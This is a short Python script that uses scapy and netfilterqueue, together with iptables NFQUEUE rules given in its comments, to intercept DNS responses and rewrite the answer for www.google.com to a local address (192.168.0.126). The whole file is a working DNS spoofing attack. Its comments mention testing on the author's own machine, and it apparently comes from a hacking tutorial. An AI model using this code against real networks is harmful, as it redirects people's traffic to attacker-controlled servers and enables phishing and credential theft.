import scapy.all as scapy
import netfilterqueue

# Create a queue for packets so we can send our modified packets to the target before the original packets
# sudo iptables -I FORWARD -j NFQUEUE --queue-num 0

# To test on own machine, use both:
# sudo iptables -I INPUT -j NFQUEUE --queue-num 0
# sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0

# To turn off IP tables rules:
# sudo iptables --flush


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.google.com" in str(qname):
            print(" - Spoofing target")
            answer = scapy.DNSRR(rrname="www.google.com", rdata="192.168.0.126")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    while True:
        queue.run()
except KeyboardInterrupt:
    print("\n - Exiting program")
